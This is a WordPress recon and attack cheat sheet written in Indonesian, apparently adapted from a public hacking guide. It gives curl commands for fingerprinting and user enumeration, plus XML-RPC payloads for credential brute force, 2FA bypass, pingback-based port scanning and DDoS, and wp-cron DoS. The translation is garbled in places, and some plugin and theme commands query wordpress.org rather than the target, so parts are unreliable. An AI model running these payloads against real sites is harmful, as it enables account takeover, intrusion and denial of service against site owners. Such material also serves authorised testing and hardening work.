# Methodology Recon di wordpress


Setelah Subdoian enumeration,dan URL crawler,,kita lanjutkan


## Passive Enumeration

```bash
# Get WordPress version
curl https://victim.com/ | grep 'content="WordPress'

# Get Plugins
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

# Get Themes
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

# Extract versions in general
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```

## Active enumeration

### Plugins and Themes
Anda mungkin tidak akan dapat menemukan semua Plugin dan Tema yang tersedia. Untuk menemukan semuanya, Anda perlu melakukan pencarian secara paksa (brute force) pada daftar Plugin dan Tema (semoga ada alat otomatis yang berisi daftar ini). 

### Users

```bash
# Serangan Brute Force ID: Anda mendapatkan pengguna yang valid dari situs WordPress dengan melakukan serangan Brute Force pada ID pengguna:

curl -s -I -X GET http://blog.example.com/?author=1

# Jika responsnya adalah 200 atau 30X , itu berarti ID tersebut valid . Jika responsnya adalah 400 , maka ID tersebut tidak valid .
# wp-json: Anda juga dapat mencoba mendapatkan informasi tentang pengguna dengan melakukan kueri:

curl http://blog.example.com/wp-json/wp/v2/users

# Endpoint Lain /wp-json/  yang dapat mengungkapkan beberapa informasi tentang pengguna adalah:

curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL

# Perlu dicatat bahwa endpoint ini hanya menampilkan pengguna yang telah membuat postingan. Hanya informasi tentang pengguna yang mengaktifkan fitur ini yang akan diberikan .
# Perlu diperhatikan juga bahwa /wp-json/wp/v2/pages dapat membocorkan alamat IP.
# Login username enumeration : Saat login /wp-login.phpPesan berbeda yang disampaikan tergantung apakah nama pengguna yang disebutkan ada atau tidak .
```


### XML-RPC
Jika xml-rpc.phpJika aktif, Anda dapat melakukan serangan brute-force kredensial atau menggunakannya untuk melancarkan serangan DoS ke sumber daya lain. 
Tools : [wpxploit](https://github.com/relarizky/wpxploit) 


Untuk memeriksa apakah aktif, coba akses /xmlrpc.php dan kirim permintaan ini:

```xml
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

**Credentials Bruteforce**

`wp.getUserBlogs`, `wp.getCategories` atau `metaWeblog.getUsersBlogs` Berikut beberapa metode yang dapat digunakan untuk melakukan serangan brute-force terhadap kredensial. Jika Anda dapat menemukan salah satunya, Anda dapat mengirimkan sesuatu seperti:

```xml
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```

Pesan "Incorrect username or password" di dalam kode respons 200 akan muncul jika kredensial tidak valid. 

Dengan menggunakan kredensial yang benar, Anda dapat mengunggah file. Dalam respons, jalur file akan muncul [https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982). 



**Bypass 2FA**
Metode ini ditujukan untuk program dan bukan untuk manusia, dan sudah usang, oleh karena itu tidak mendukung 2FA. Jadi, jika Anda memiliki kredensial yang valid tetapi pintu masuk utama dilindungi oleh 2FA, Anda mungkin dapat menyalahgunakan xmlrpc.php untuk masuk dengan kredensial tersebut dan melewati 2FA . Perhatikan bahwa Anda tidak akan dapat melakukan semua tindakan yang dapat Anda lakukan melalui konsol, tetapi Anda mungkin masih dapat mengakses RCE seperti yang dijelaskan Ippsec di [https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s] https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s

**DDoS or port scanning**
Jika Anda dapat menemukan metode **pingback.ping** di dalam daftar tersebut, Anda dapat membuat Wordpress mengirimkan permintaan sembarangan ke host/port mana pun.
Ini dapat digunakan untuk meminta **satu** ( **lokasi** sehingga r**ibuan situs Wordpress mengakses** serangan **DDoS** terjadi di lokasi tersebut) atau Anda dapat menggunakannya untuk membuat **Wordpress** memindai . internal **jaringan** (Anda dapat menentukan port apa pun)

```xml
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```

Jika Anda mendapatkan **faultCode** dengan nilai **lebih besar** dari 0 (17), itu berarti port tersebut terbuka.

Perhatikan penggunaan `system.multicall` Pada bagian sebelumnya, Anda telah mempelajari cara menyalahgunakan metode ini untuk menyebabkan serangan DDoS. 

**DDoS**

```xml
<methodCall>
    <methodName>pingback.ping</methodName>
    <params>
        <param><value><string>http://target/</string></value></param>
        <param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
    </params>
</methodCall>
```

**wp-cron.php DoS**

File ini biasanya terletak di direktori utama situs WordPress: `/wp-cron.php`
Saat file ini **diakses** , sebuah yang " berat MySQL kueri" akan dijalankan, sehingga dapat digunakan oleh **penyerang** untuk **menyebabkan** serangan **DoS** .

Selain itu, secara default,Fungsi `wp-cron.php`  ini dipanggil setiap kali halaman dimuat (kapan pun klien meminta halaman WordPress apa pun), yang pada situs dengan trafik tinggi dapat menyebabkan masalah (DoS).

Disarankan untuk menonaktifkan Wp-Cron dan membuat cronjob sungguhan di dalam host yang menjalankan tindakan yang dibutuhkan secara berkala (tanpa menimbulkan masalah).
